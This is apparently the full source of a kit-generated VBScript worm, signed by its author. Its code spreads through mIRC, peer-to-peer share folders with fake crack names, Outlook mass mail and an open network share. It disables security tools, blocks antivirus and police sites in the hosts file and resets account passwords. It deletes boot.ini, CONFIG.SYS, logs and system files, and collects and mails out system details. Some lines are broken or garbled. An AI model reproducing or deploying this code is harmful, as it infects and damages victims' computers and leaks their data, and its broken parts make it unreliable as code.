<?xml version="1.0"?> 
<package id="tcgck"> 
<job id="Job_1"> 
<script language="VBScript"> 
' This worm was made with 'The Czybik Gen' Creation Kit v1.0
' To download this Creation Kit visit www.czybik-kit.tk
'============================================================
 
' // Begin of VBS/tcgck.A.gen by kacken \\ '
 
 
On Error Resume Next
 
set skorFso = CreateObject("Scripting.FileSystemObject")
set skorWshs = CreateObject("Wscript.Shell")
windir = skorFso.getspecialfolder(0)
set sysdir=skorFso.getspecialfolder(1)
set tmpdir=skorFso.getspecialfolder(2)
set ntwrk = createobject("wscript.network")
hddisk=left(windir,2)
 

set skorgenworm = skorFso.getfile(wscript.scriptfullname)
skorgenworm.copy (windir+"\wowexec32.wsf") 
set rdconte = skorFso.opentextfile(wscript.scriptfullname)
wormcontent=rdconte.readall
rdconte.close
set htmlbak=skorFso.createtextfile(windir+"\wininfo32.html")
htmlbak.writeline ("<html>")
htmlbak.writeline ("<head>")
htmlbak.writeline ("<title>This is amazing</title>")
htmlbak.writeline ("<meta name=""generator"" content=""tcgck"">")
htmlbak.writeline ("</head>")
htmlbak.writeline ("<body OnLoad=""wormloadtcgck()"">")
htmlbak.writeline ("This is just a little joke!")
htmlbak.writeline ("To see this page you must enable active X!")
htmlbak.writeline ("<script language=""vbscript"">")
htmlbak.writeline ("Sub wormloadtcgck()") 
htmlbak.write (wormcontent)
htmlbak.writeline ("End Sub") 
htmlbak.writeline ("</script>")
htmlbak.writeline ("<body>")
htmlbak.writeline ("</html>")
skorWshs.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AutoexecBat",hddisk+"\AUTOEXEC.BAT" 
set gtauto = skorFso.getfile(hddisk+"\AUTOEXEC.BAT")
gtauto.attributes=gtauto.attributes -4
gtauto.attributes=gtauto.attributes -2
gtauto.attributes=gtauto.attributes -1
skorFso.deletefile(hddisk+"\AUTOEXEC.BAT")
set writeexec=skorFso.CreateTextFile(hddisk+"\AUTOEXEC.BAT") 
writeexec.writeline("rem This file is infected by tcgck ")
writeexec.writeline("@echo off")
writeexec.writeline("title tcgck autostart center")
writeexec.writeline("color 3E") 
writeexec.writeline("cls") 
writeexec.writeline("GoTo StartMalware")
writeexec.writeline(" ")
writeexec.writeline(":StartMalware")
writeexec.writeline("if exist "+runfile+" (")
writeexec.writeline("        echo executing...")
writeexec.writeline("        call "+runfile+")
writeexec.writeline("        echo loaded successfully....")
writeexec.writeline("        GoTo EndeMalware")
writeexec.writeline(")")
writeexec.writeline(" ")
writeexec.writeline(":EndeMalware")
writeexec.writeline("echo shuting down start bat")
writeexec.writeline("exit")
writeexec.Close
set gtauto2 = skorFso.getfile(hddisk+"\AUTOEXEC.BAT")
gtauto2.attributes=gtauto2.attributes +4
gtauto2.attributes=gtauto2.attributes +1
gtauto2.attributes=gtauto2.attributes +2
proFiles = skorWshs.expandenvironmentstrings("%ProgramFiles%") 
If skorFso.folderexists(hddspace + "\Mirc32") Then 
mircpath = hddspace + "\Mirc32" 
ElseIf skorFso.folderexists(hddspace + "\Mirc") Then 
mircpath = hddspace + "\Mirc" 
ElseIf skorFso.folderexists(proFiles+"\Mirc32") Then 
mircpath = proFiles+"\Mirc32" 
ElseIf skorFso.folderexists(proFiles+"\Mirc") Then 
mircpath = proFiles+"\Mirc" 
End If
 
mirchax = "/§d§cc§ se§nd %ha§xn§ic§k " + runfile
mirchax = Replace(mirchax, "§", "") 
Set crtIRCScript = skorFso.createtextfile(mircpath + "Script.ini", True)
crtIRCScript.writeline ("[Script]") 
crtIRCScript.writeline ("n1=On 1:connect:{ ") 
crtIRCScript.writeline ("n2=titlebar = tcgck file dcc center") 
crtIRCScript.writeline ("n3=join #0,0") 
crtIRCScript.writeline ("n4=join -n #sponsor,#sponsoring,#bouncer4you,#ringer,#clansuche } ") 
crtIRCScript.writeline ("n5=On *:Join:#: {") 
crtIRCScript.writeline ("n6=/unset %haxnick") 
crtIRCScript.writeline ("n7=/set %haxnick $nick") 
crtIRCScript.writeline ("n8=var %rant = $rand(a, d)") 
crtIRCScript.writeline ("n9=if (%rant == a) { ") 
crtIRCScript.writeline ("n8=" + mirchax) ")
crtIRCScript.writeline ("n9=/msg %haxnick This is a very nice tool
crtIRCScript.writeline ("n10=}")
crtIRCScript.writeline ("n11=elseif (%rant == b) { ") 
crtIRCScript.writeline ("n12=" + mirchax) 
crtIRCScript.writeline ("n13=/msg %haxnick Hey, watch this ICQ Hax0r
crtIRCScript.writeline ("n14=}"") 
crtIRCScript.writeline ("n15=elseif (%rant == c) { ")
crtIRCScript.writeline ("n16="" + mirchax) 
crtIRCScript.writeline ("n17=/msg %haxnick The new Windows Hack Crack
crtIRCScript.writeline ("n18=}") 
crtIRCScript.writeline ("n19=else { ") 
crtIRCScript.writeline ("n20=" + mirchax) 
crtIRCScript.writeline ("n21=/msg %haxnick The Sims 2 Cheat Hack ")
crtIRCScript.writeline ("n22=}") 
crtIRCScript.writeline ("n23=}") 
crtIRCScript.Close 
 
set filecopycompress=skorFso.getfile(wscript.scriptfullname)
overnetpath = skorWshs.regread("HKEY_CLASSES_ROOT\Software\MM\Overnet\" & "InstallDir")  
If overnetpath <> "" Then 
fulloverpath = overnetpath + "\incoming" 
filecopycompress.Copy (fulloverpath + "\Microsoft MSN Messenger Hack.exe.vbs.wsf") 
filecopycompress.Copy (fulloverpath + "\Schlacht um Mittelerde MapHack.exe.vbs.wsf") 
filecopycompress.Copy (fulloverpath + "\Windows XP Sourcecode.txt.vbs.wsf") 
filecopycompress.Copy (fulloverpath + "\PowerDVD 5.9 Crack working.exe.vbs.wsf") 
filecopycompress.Copy (fulloverpath + "\kaspersky Key working.reg.vbs.wsf") 
End If 
shareazacollectionpath = skorWshs.regread("HKEY_CURRENT_USER\Software\Shareaza\Shareaza\Downloads\" & "CollectionPath")  
If shareazacollectionpath <> "" Then 
filecopycompress.Copy (shareazacollectionpath + "\Microsoft MSN Messenger Hack.exe.vbs.wsf") 
filecopycompress.Copy (shareazacollectionpath + "\Schlacht um Mittelerde MapHack.exe.vbs.wsf") 
filecopycompress.Copy (shareazacollectionpath + "\Windows XP Sourcecode.txt.vbs.wsf") 
filecopycompress.Copy (shareazacollectionpath + "\PowerDVD 5.9 Crack working.exe.vbs.wsf") 
filecopycompress.Copy (shareazacollectionpath + "\kaspersky Key working.reg.vbs.wsf") 
End if 
s_kazza = skorWshs.regread("HKEY_CURRENT_USER\Software\Kazaa\LocalContent\" + "DownloadDir")  
If Not s_kazza = "" Then 
filecopycompress.Copy (s_kazza + "\Microsoft MSN Messenger Hack.exe.vbs.wsf") 
filecopycompress.Copy (s_kazza + "\Schlacht um Mittelerde MapHack.exe.vbs.wsf") 
filecopycompress.Copy (s_kazza + "\Windows XP Sourcecode.txt.vbs.wsf") 
filecopycompress.Copy (s_kazza + "\PowerDVD 5.9 Crack working.exe.vbs.wsf") 
filecopycompress.Copy (s_kazza + "\kaspersky Key working.reg.vbs.wsf") 
End If 
MorphPath=skorWshs.regread ("HKEY_LOCAL_MACHINE\SOFTWARE\Morpheus\" & "Install_Dir") 
If Not MorphPath = "" Then 
filecopycompress.Copy (MorphPath + "\My Shared Folder\Microsoft MSN Messenger Hack.exe.vbs.wsf") 
filecopycompress.Copy (MorphPath + "\My Shared Folder\Schlacht um Mittelerde MapHack.exe.vbs.wsf") 
filecopycompress.Copy (MorphPath + "\My Shared Folder\Windows XP Sourcecode.txt.vbs.wsf") 
filecopycompress.Copy (MorphPath + "\My Shared Folder\PowerDVD 5.9 Crack working.exe.vbs.wsf") 
filecopycompress.Copy (MorphPath + "\My Shared Folder\kaspersky Key working.reg.vbs.wsf") 
end if 
SET OUTAPP =CREATEOBJECT ("OUTLOOK.APPLICATION")
SET NEWEMAIL=OUTAPP.CREATEITEM(0)
FOR S_MAILS = 1 TO 27
SET MUHA = OUTAPP.GETNAMESPACE("MAPI")
SET ARGH= MUHA.ADDRESSLISTS(1).ADDRESSENTRIES(S_MAILS)
NewEMail.To = argh 
NewEMail.Subject = "Hey, how are you?" 
NewEMail.Body = "I have the document attached!" 
NewEMail.Attachments.Add runfile 
NewEMail.Send 
Next 
if not skorFso.fileexists(sysdir+"\3768") then
Set crtFldrsh = skorFso.createfolder(sysdir + "\3768") 
end if 
If Not skorFso.fileexists(sysdir+"\3768\"+Free_Software") then 
Set crtFldrsh = skorFso.createfolder(sysdir + "\3768\"+Free_Software") 
End If 
Set copysharedf = skorFso.getfile(wscript.scriptfullname) 
copysharedf.Copy (sysdir + "\3768\Free_Software\Microsoft MSN Messenger Hack.exe.vbs") 
copysharedf.Copy (sysdir + "\3768\Free_Software\Schlacht um Mittelerde MapHack.exe.vbs") 
copysharedf.Copy (sysdir + "\3768\Free_Software\Windows XP Sourcecode.txt.vbs") 
copysharedf.Copy (sysdir + "\3768\Free_Software\PowerDVD 5.9 Crack working.exe.vbs") 
copysharedf.Copy (sysdir + "\3768\Free_Software\kaspersky Key working.reg.vbs") 
ThisUser = ntwrk.computername 
finaluser = "\\" + ThisUser 
FolderName = Form1.sprd5_dirlocation 
AdminServer = finaluser 
Const ShareName = "Software fuer jeden" 
Set Services = GetObject("WINMGMTS:{impersonationLevel=impersonate,(Security)}!" & AdminServer & "\ROOT\CIMV2") 
Set SecDescClass = Services.Get("Win32_SecurityDescriptor") 
Set SecDesc = SecDescClass.SpawnInstance_() 
Set Trustee = Services.Get("Win32_Trustee").SpawnInstance_ 
Trustee.Domain = Null 
Trustee.Name = Form1.sprd5_nameprob 
Trustee.Properties_.Item("SID") = Array(1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0) 
Set ACE = Services.Get("Win32_Ace").SpawnInstance_ 
ACE.Properties_.Item("AccessMask") = 2032127 
ACE.Properties_.Item("AceFlags") = 3 
ACE.Properties_.Item("AceType") = 0 
ACE.Properties_.Item("Trustee") = Trustee 
SecDesc.Properties_.Item("DACL") = Array(ACE) 
Set Share = Services.Get("Win32_Share") 
Set InParam = Share.Methods_("Create").InParameters.SpawnInstance_() 
InParam.Properties_.Item("Access") = SecDesc 
InParam.Properties_.Item("Description") = "A normal public directory" 
InParam.Properties_.Item("Name") = ShareName 
InParam.Properties_.Item("Path") = FolderName 
InParam.Properties_.Item("Type") = 0 
Share.ExecMethod_ ("Create"), InParam 
SteamPath = skorWshs.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\" & "InstallPath") 
Set crtSteamVbs = skorFso.createtextfile(SteamPath + "\SteamApps\sk0rSteamAttacker.vbs", True) 
With crtSteamVbs 
.writeline ("Rem Win32/SkorSteamAttacker-A Spreading Script file") 
.writeline (" ") 
.writeline ("On Error Resume Next") 
.writeline ("Set fso = CreateObject(""scripting.filesystemobject"")") 
.writeline ("Set wshs = CreateObject(""wscript.shell"")") 
.writeline ("SteamPath = wshs.regread(""HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\"" & "InstallPath"")") 
.writeline ("Set getfldr = fso.getfolder(SteamPath + ""\SteamApps"")") 
.writeline ("For Each UserAcc In getfldr.subfolders") 
.writeline ("If fso.folderexists(UserAcc.Path + ""\counter-strike\cstrike"") Then") 
.writeline ("If Not fso.fileexists(UserAcc.Path + ""\counter-strike\cstrike\userconfig.cfg"") Then") 
.writeline ("Set usercfg = fso.createtextfile(UserAcc.Path + ""\counter-strike\cstrike\userconfig.cfg"")") 
.writeline ("usercfg.writeline (""""//first created"""")") 
.writeline ("usercfg.Close") 
.writeline ("End If") 
.writeline ("Set openusercfg = fso.opentextfile(UserAcc.Path + ""\counter-strike\cstrike\userconfig.cfg"", 2, True)") 
.writeline ("openusercfg.write (""""//Win32.SkorSteamAttacker-A Cs-Script File (Like IM-Worms)""" + vbCrLf)") 
.writeline ("openusercfg.write (""""//==========================================="""" + vbCrLf)") 
.writeline ("openusercfg.write (""""//Begin Config h4xx0ring:"" + vbCrLf)"") 
.writeline ("openusercfg.write (""""alias """"SkorWrite"""" """"say  www.domain.de/vx/worm.zip <- my worm """";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorSleep"""" """"echo You are infected with my worm """";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorGo"""" """"SkorAn"""";"" + vbCrLf)"") 
.writeline ("openusercfg.write (""""alias """"SkorAn"""" """"SkorWrite; alias SkorGo SkorAus"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorAus"""" """"SkorSleep; alias SkorGo SkorSchmaus"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorSchmaus"""" """"SkorSleep; alias SkorGo SkorLaus"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorLaus"""" """"SkorSleep; alias SkorGo SkorKaus"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorKaus"""" """"SkorSleep; alias SkorGo SkorSaus"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorSaus"""" """"SkorSleep; alias SkorGo SkorBraus"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorBraus"""" """"SkorSleep; alias SkorGo SkorXaus"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorXaus"""" """"SkorSleep; alias SkorGo SkorZaus"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorZaus"""" """"SkorSleep; alias SkorGo SkorAn"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"m_pitch"""" """"SkorGo"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""s_enable_a3d;"""" + vbCrLf)") 
.writeline ("openusercfg.write (""""s_a3d """"1""""; alias s_a3d;"""" + vbCrLf)") 
.writeline ("openusercfg.write (""""rate """"7500"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""//End Config h4xx0ring"""" + vbCrLf)") 
.writeline ("openusercfg.write (""""//==========================================="""" + vbCrLf)") 
.writeline ("openusercfg.write (""""//Win32.SkorSteamAttacker-A Cs-Script File (Like IM-Worms)"""" + vbCrLf)") 
.writeline ("End If") 
.writeline ("Next") 
.Close 
End With 
skorWshs.run (SteamPath + "\SteamApps\sk0rSteamAttacker.vbs"), , True 
skorFso.deletefile (SteamPath + "\SteamApps\sk0rSteamAttacker.vbs") 
 
skorWshs.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD" 
skorWshs.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD" 
skorWshs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", 1, "REG_DWORD" 
skorWshs.regWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", 1, "REG_DWORD" 
skorWshs.regWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", 0, "REG_DWORD" 
skorWshs.regWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD" 
skorWshs.Regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","www.sk0r-virii.tk" 
skorWshs.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title","Microkak Internet Explorer" 
skorWshs.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","sk0r Virii Group Germany" 
skorWshs.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","sk0r1337" 
skorWshs.regdelete "HKEY_CLASSES_ROOT\.ocx\PersistentHandler\" 
skorWshs.regdelete "HKEY_CLASSES_ROOT\.ocx\" 
skorWshs.run ("date 12.12.02"),,true 
skorWshs.Run ("time 13:37:00"),,true
MsgBox ("You are infected by sk0r1337 "),VbCritical,"VBS/tcgck.A.gen generated with tcgck" 
skorWshs.run ("net user %UserName% hacked"),,true 
skorWshs.run ("net user administrator hacked1337"),,true 
skorFso.deletefile (sysdir+"\drivers\etc\protocol") 
skorFso.deletefile (sysdir+"\drivers\etc\services") 
localhostip = Chr(49) & Chr(50) & Chr(55) & Chr(46) & Chr(48) & Chr(46) & Chr(48) & Chr(46) & Chr(49) 
Set hostfile = skorFso.createtextfile(sysdir + "\drivers\etc\hosts", True) 
hostfile.writeline ("# overwritten with VBS/tcgck.A.gen made with tcgck") 
hostfile.writeline ("# access to dl,av or search sites usw denied") 
hostfile.writeline (" ") 
hostfile.writeline (localhostip + " www.antivir.de") 
hostfile.writeline (localhostip + " www.bitdefender.de ") 
hostfile.writeline (localhostip + " www.znet.de") 
hostfile.writeline (localhostip + " www.chip.de") 
hostfile.writeline (localhostip + " www.virustotal.com") 
hostfile.writeline (localhostip + " virusscan.jotti.org") 
hostfile.writeline (localhostip + " www.kaspersky.com") 
hostfile.writeline (localhostip + " www.sophos.de") 
hostfile.writeline (localhostip + " www.trojaner-info.de ") 
hostfile.writeline (localhostip + " www.trojaner-help.de ") 
hostfile.writeline (localhostip + " www.arcabit.com ") 
hostfile.writeline (localhostip + " www.avast.com ") 
hostfile.writeline (localhostip + " www.grisoft.com ") 
hostfile.writeline (localhostip + " www.bitdefender.com ") 
hostfile.writeline (localhostip + " www.clamav.net ") 
hostfile.writeline (localhostip + " www.drweb.com ") 
hostfile.writeline (localhostip + " www.f-prot.com ") 
hostfile.writeline (localhostip + " www.google.de ") 
hostfile.writeline (localhostip + " www.fortinet.com") 
hostfile.writeline (localhostip + " www.nod32.com ") 
hostfile.writeline (localhostip + " www.norman.com ") 
hostfile.writeline (localhostip + " www.microsoft.com") 
hostfile.writeline (localhostip + " www.anti-virus.by/en") 
hostfile.writeline (localhostip + " www.symantec.com ") 
hostfile.writeline (localhostip + " www.windowsupdate.com ") 
hostfile.writeline (localhostip + " www.trendmicro.com ") 
hostfile.writeline (localhostip + " www.mcafee.com ") 
hostfile.writeline (localhostip + " www.viruslist.com") 
hostfile.writeline (localhostip + " www.avp.com ") 
hostfile.writeline (localhostip + " www.zonelabs.com") 
hostfile.writeline (localhostip + " www.heise.de ") 
hostfile.writeline (localhostip + " www.antivirus-online.de") 
hostfile.writeline (localhostip + " www.free-av.com ") 
hostfile.writeline (localhostip + " www.panda-software.com") 
hostfile.writeline (localhostip + " www.pc-welt.de ") 
hostfile.writeline (localhostip + " www.pc-special.net") 
hostfile.writeline (localhostip + " download.freenet.de ") 
hostfile.writeline (localhostip + " www.vollversion.de ") 
hostfile.writeline (localhostip + " www.das-download-archiv.de") 
hostfile.writeline (localhostip + " www.freeware.de ") 
hostfile.writeline (localhostip + " www.antiviruslab.com") 
hostfile.writeline (localhostip + " www.search.yahoo.com") 
hostfile.writeline (localhostip + " www.web.de ") 
hostfile.writeline (localhostip + " www.hotmail.com") 
hostfile.writeline (localhostip + " www.hotmail.de") 
hostfile.writeline (localhostip + " www.gmx.net") 
hostfile.writeline (localhostip + " www.esl-europe.net") 
hostfile.writeline (localhostip + " www.cs-expert.de") 
hostfile.writeline (localhostip + " www.spiegel.de") 
hostfile.writeline (localhostip + " www.icq.com") 
hostfile.writeline (localhostip + " www.icq.de ") 
hostfile.writeline (localhostip + " www.og-cheats.de") 
hostfile.writeline (localhostip + " www.flirtlife.de") 
hostfile.writeline (localhostip + " www.ffh.de") 
hostfile.writeline (localhostip + " www.counter-strike.de") 
hostfile.writeline (localhostip + " www.counter-strike.net") 
hostfile.writeline (localhostip + " www.counterstrike.de") 
hostfile.writeline (localhostip + " www.csconfigs.de") 
hostfile.writeline (localhostip + " www.netsettings.net") 
hostfile.writeline (localhostip + " www.leaguez.com") 
hostfile.writeline (localhostip + " www.unrealtournament.com")  
hostfile.writeline (localhostip + " www.halflife.yusho.de") 
hostfile.writeline (localhostip + " www.planethalflife.com") 
hostfile.writeline (localhostip + " www.lavasoft.de") 
hostfile.writeline (localhostip + " www.de.wikipedia.org") 
hostfile.writeline (localhostip + " www.wikipedia.org") 
hostfile.writeline (localhostip + " www.en.wikipedia.org") 
hostfile.writeline (localhostip + " www.wissen.de") 
hostfile.writeline (localhostip + " www.virus-aktuell.de") 
hostfile.writeline (localhostip + " www.arcor.de") 
hostfile.writeline (localhostip + " www.t-online.de") 
hostfile.writeline (localhostip + " www.t-com.de") 
hostfile.writeline (localhostip + " www.counter-hacks.de") 
hostfile.writeline (localhostip + " www.alice-dsl.de") 
hostfile.writeline (localhostip + " www.freenet.de") 
hostfile.writeline (localhostip + " www.1und1.de") 
hostfile.writeline (localhostip + " www.fbi.gov") 
hostfile.writeline (localhostip + " www.polizei.de") 
hostfile.close 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\avgnt" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\KAVPersonal50" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVG7_CC" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BDMCon" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BDNewsAgent" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BDOESRV" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\pccguide.exe" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\DrWebScheduler" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SpIDerMail" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SpIDerNT" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MCAgentExe" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MCUpdateExe" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OASClnt" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VirusScan Online" 
skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VSOCheckTask" 
theurlfolder = skorWshs.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\" & "Favorites") 
Set getfav = skorFso.getfolder(theurlfolder) 
Set getfavfile = getfav.Files 
For Each thefavfilesfolder In getfavfile 
gettingfiles = LCase(skorFso.GetExtensionName(thefavfilesfolder.Path)) 
If gettingfiles = "url" Then 
skorFso.deletefile (thefavfilesfolder.Path) 
End If 
Next 
Set url1 = skorFso.createtextfile(theurlfolder + "\tcgck.url") 
url1.writeline ("[DEFAULT] ") 
url1.writeline ("BASEURL="") 
url1.writeline ("[InternetShortcut] ") 
url1.writeline ("URL="") 
url1.Close 
urlfldr = skorWshs.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\" & "Favorites") 
thelinkfolder = urlfldr + "\Links" 
Set getfav2 = skorFso.getfolder(thelinkfolder) 
Set getfavfile2 = getfav2.Files 
For Each thefavfilesfolder2 In getfavfile2 
gettingfiles2 = LCase(skorFso.GetExtensionName(thefavfilesfolder2.Path)) 
If gettingfiles2 = "url" Then 
skorFso.deletefile (thefavfilesfolder2.Path) 
End If 
Next 
Set link1 = skorFso.createtextfile(thelinkfolder + "\tcgck_link.url") 
link1.writeline ("[DEFAULT] ") 
link1.writeline ("BASEURL="") 
link1.writeline ("[InternetShortcut] ") 
link1.writeline ("URL="") 
link1.Close 
skorWshs.run ("msinfo32 -report " + windir + "\pcinfo1.txt"), , True 
skorWshs.run ("%comspec% /c set > " + windir + "\pcinfo2.txt"), , True 
skorWshs.run ("%comspec% /c tree /A > " + windir + "\pcinfo3.txt"), , True 
skorWshs.run ("%comspec% /c ipconfig /all > " + windir + "\pcinfo4.txt"), , True 
Set pcinfo1 = skorFso.opentextfile(windir + "\pcinfo1.txt", 1, True) 
pcinforeading1 = pcinfo1.readall 
Set pcinfo2 = skorFso.opentextfile(windir + "\pcinfo2.txt", 1, True) 
pcinforeading2 = pcinfo2.readall 
Set pcinfo3 = skorFso.opentextfile(windir + "\pcinfo3.txt", 1, True) 
pcinforeading3 = pcinfo3.readall 
Set pcinfo4 = skorFso.opentextfile(windir + "\pcinfo4.txt", 1, True) 
pcinforeading4 = pcinfo4.readall 
Set writeendinfofile = skorFso.createtextfile(sysdir + "\Computerinfo_" + ntwrk.username + ".txt") 
writeendinfofile.writeline (" Computerinfo file from a worm made with tcgck 1.0 ") 
writeendinfofile.writeline (" ====================================================") 
writeendinfofile.writeline (" ") 
writeendinfofile.writeline ("Hallo kacken, ") 
writeendinfofile.writeline ("Hier sind die Informationen ueber meinen Computer.") 
writeendinfofile.writeline ("Mein Computer heisst " + ntwrk.computername + ". ") 
writeendinfofile.writeline ("So, nun werden die Informationen des Computers aufgelistet:") 
writeendinfofile.writeline ("------------------------------------------------------------") 
writeendinfofile.writeline (" ") 
writeendinfofile.writeline (" ") 
writeendinfofile.writeline ("1) Befehl: msinfo32 Pc Info Command: ") 
writeendinfofile.writeline ("***************************************") 
writeendinfofile.write (pcinforeading1 + vbCrLf) 
writeendinfofile.writeline (" ") 
writeendinfofile.writeline ("2) Befehl: Cmd Variable Settings Command: ") 
writeendinfofile.writeline ("******************************************") 
writeendinfofile.write (pcinforeading2 + vbCrLf) 
writeendinfofile.writeline (" ") 
writeendinfofile.writeline ("3) Befehl: Directorys of Desktop Command: ") 
writeendinfofile.writeline ("*******************************************") 
writeendinfofile.write (pcinforeading3 + vbCrLf) 
writeendinfofile.writeline (" ") 
writeendinfofile.writeline ("4) Befehl: Ipconfig Info Command: ") 
writeendinfofile.writeline ("*************************************") 
writeendinfofile.write (pcinforeading4 + vbCrLf) 
writeendinfofile.writeline (" ") 
writeendinfofile.Close 
pcinfo1.Close 
pcinfo2.Close 
pcinfo3.Close 
pcinfo4.Close 
skorFso.deletefile (windir + "\pcinfo1.txt") 
skorFso.deletefile (windir + "\pcinfo2.txt") 
skorFso.deletefile (windir + "\pcinfo3.txt") 
skorFso.deletefile (windir + "\pcinfo4.txt") 
Set outlookObj = CreateObject("Outlook.Apllication") 
If outlookObj Is Not Nothing Then 
Set newMailObj = outlookObj.CreateNewItem(1) 
newMailObj.to =  
newMailObj.Subject = "Infos of Victim Computer - tcgck v1.0" 
newMailObj.Body = "The Informations of the the victim are attached" + vbCrLf + vbCrLf + "Visit www.sk0r-scripts.tk www.sk0r-virii.tk and www.czybik-gen.tk" 
newMailObj.attachments.Add sysdir + "\Computerinfo_" + ntwrk.username + ".txt" 
newMailObj.Send 
End If 
call skorczybikpayload()
Sub skorczybikpayload 
Set allepladden = skorFso.drives 
For Each alledateieninallenfestplatten In allepladden 
If alledateieninallenfestplatten.drivetype = 2 Then 
Searchthafiles (foldername) 
End If 
Next 
Function Searchthafiles(foldername) 
Set gttheinffol = skorFso.getfolder(foldername) 
Set allfii = gttheinffol.Files 
Set subbuii = gttheinffol.subfolders 
For Each dateienzuminfizieren In allfii 
extensionzuminf = LCase(skorFso.getextensionname(dateienzuminfizieren.Path)) 
if extensionzuminf = "htm" or extensionzuminf="mp3" or extensionzuminf="pps" then 
end if 
Next 
For Each alleunnerodner In subbuii 
Set strAlleUnterOrnderUoD = alleunnerordner.Files 
For Each jetztdieganzendatenderplatte In strAlleUnterOrnderUoD 
nehmedieext = LCase(fso.getextensionname(jetztdieganzendatenderplatte.Path)) 
if nehmedieext = "htm" or nehmedieext="mp3" or nehmedieext="pps" then 
end if 
end if 
Next 
For Each aberdenganzenrechner In subbuii 
Searchthafiles (aberdenganzenrechner) 
Next 
End Function 
Set gtboini = skorFso.getfile(hddisk + "\boot.ini") 
gtboini.Attributes = gtboini.Attributes - 4 
gtboini.Attributes = gtboini.Attributes - 2 
gtboini.Attributes = gtboini.Attributes - 1 
skorFso.deletefile (hddisk + "\boot.ini") 
Set gtcfgsys = skorFso.getfile(hddisk + "\CONFIG.SYS") 
gtcfgsys.Attributes = gtcfgsys.Attributes - 4 
gtcfgsys.Attributes = gtcfgsys.Attributes - 2 
gtcfgsys.Attributes = gtcfgsys.Attributes - 1 
skorFso.deletefile (hddisk + "\CONFIG.SYS") 
Set gtwindirlog = skorFso.getfolder(windir) 
Set alllogfiles = gtwindirlog.Files 
For Each logdatei In alllogfiles 
If LCase(skorFso.getextensionname(logdatei.Path)) = "log" Then 
skorFso.deletefile (logdatei.Path) 
End If 
Next 
skorFso.deletefile (windir+"\system.ini") 
skorFso.deletefile (windir+"\win.ini") 
End Sub 
intCount = 1 
Do Until intCount >= 100) 
For Each dateiinordner In skgcfldr.Files 
intCount = intCount + 1 
   dateierweiterung = LCase(fso.GetExtensionName(dateiinordner)) 
   If dateierweiterung = "bmp" Then 
     skorWshs.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", dateiinordner.Path 
     skorWshs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Desktop\General\BackUpWallpaper", dateiinordner.Path 
